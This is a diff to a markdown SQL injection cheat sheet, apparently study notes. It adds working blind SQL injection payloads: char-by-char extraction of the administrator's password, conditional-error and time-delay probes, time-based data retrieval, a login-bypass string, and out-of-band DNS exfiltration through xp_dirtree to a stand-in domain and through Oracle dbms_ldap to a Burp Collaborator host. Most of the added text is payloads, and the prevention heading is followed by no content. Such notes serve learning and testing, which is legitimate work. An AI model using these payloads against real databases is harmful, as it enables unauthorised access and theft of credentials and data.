@@ -41,15 +41,40 @@ You can have those following examples :
 	- ``` union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME--```
 		*Very usefull when you only have the capacity to extract data from a uniq column*
 		
+###### Blind SQL attack 
 
-- Blind SQL injection with conditional responses
-- Blind SQL injection with conditional errors
-- Blind SQL injection with time delays
-- Blind SQL injection with time delays and information retrieval
-- Blind SQL injection with out-of-band interaction
-- Blind SQL injection with out-of-band data exfiltration
-- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+- Conditional responses
+	The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : 
+	* `' and (select substring(password,1,1) from users where username='administrator')='a`
+	
+- Conditional errors
+	The goal here is to check errors based on a True query and on a false one. Here is an example:
+	* `' and (select case when (1=2) then 1/0 else 'a' end)='a` => True statement
+	* `' and (select case when (1=1) then 1/0 else 'a' end)='a` => False statement
+	
+- Time delays
+    This one is the favorite of everyone to quickly check for blind SQL. The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. If there is one, and if this latence is proportionate to your sleep value, then you know that you've got SQLi. Examples : 
+	* `';sleep(10)--`
+	* `'; if (1=1) waitfor delay '0:0:5'--`
+	
+- Time delays and information retrieval
+	Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. Here is an example : 
+	* `'; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '0:0:5'--`
+	
+- Out-of-band (OAST)
+   This type of SQLi is perform against asynchronous system. The goal here is to trigger out-of-band network. We usually use DNS protocol because that's simplier and available on any system. To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. Basicly we will redirect to our controlled domain on True or False condition. For example we can perform those :
+   * For Microsoft SQL Server
+      		
+		* `'; exec master..xp\_dirtree '//MYDOMAIN/a'--` *basic test*
+		
+		* `declare @q varchar(1024); set @q = 'master..xp\_dirtree '\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\_name()), 1),1,60) + '.MYDOMAIN\\foo'; exec(@q)` *return data on subdomain param*
+   *  MYSQL
+	   * Check for the LOAD\_FILE, sys\_eval, http\_get, .. functions
+	* ORACLE
+		* `select dbms_ldap.init((select version from v$instance)||'.'||(select user from 		dual)||'.'||(select name from 	v$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) from 	dual;`
+
 - SQL injection vulnerability allowing login bypass
+	* Very simple : `username'--`
 
 ###### How to prevent them 
 
